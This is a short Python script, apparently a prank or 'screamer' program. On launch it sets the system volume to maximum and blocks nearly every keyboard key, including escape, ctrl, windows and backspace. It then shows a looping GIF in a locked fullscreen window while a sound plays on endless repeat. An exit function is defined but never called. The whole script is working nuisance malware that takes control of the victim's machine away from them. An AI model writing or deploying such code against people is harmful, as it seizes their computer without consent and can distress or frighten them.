import pygame
from ctypes import cast, POINTER
import keyboard
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

import tkinter as tk
from PIL import Image, ImageTk
from itertools import count
import sys

pygame.init()
pygame.mixer.init()
sound = pygame.mixer.Sound("sound.mp3")
devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))

volume.SetMasterVolumeLevelScalar(1, None)


block = ["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", 
         "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "\n", 
         "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
         "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", 
         "*", "-", "=", "+", "|", "`", "shift", "windows", "esc", "backspace", "ctrl"]
for key in block:
    keyboard.block_key(key)

class ImageLabel(tk.Label):
    """a label that displays images, and plays them if they are gifs"""
    def load(self, im):
        if isinstance(im, str):
            im = Image.open(im)
        self.loc = 0
        self.frames = []
        try:
            for i in count(1):
                self.frames.append(ImageTk.PhotoImage(im.copy()))
                im.seek(i)
        except EOFError:
            pass
        try:
            self.delay = im.info['duration']
        except:
            self.delay = 100
        if len(self.frames) == 1:
            self.config(image=self.frames[0])
        else:
            self.next_frame()
    def unload(self):
        self.config(image="")
        self.frames = None
    def next_frame(self):
        if self.frames:
            self.loc += 1
            self.loc %= len(self.frames)
            self.config(image=self.frames[self.loc])
            self.after(self.delay, self.next_frame)

    
def main():
    root = tk.Tk()
    root.geometry("1920x1080")
    root.resizable(False, False)
    root.attributes("-fullscreen", True)
    root.configure(bg="black")

    lbl = ImageLabel(root)
    lbl.pack(expand=True)
    lbl.load('gif.gif')

    sound.play(-1)
    root.mainloop()

def exit_program():
    sys.exit(1)


if __name__ == "__main__":
    main()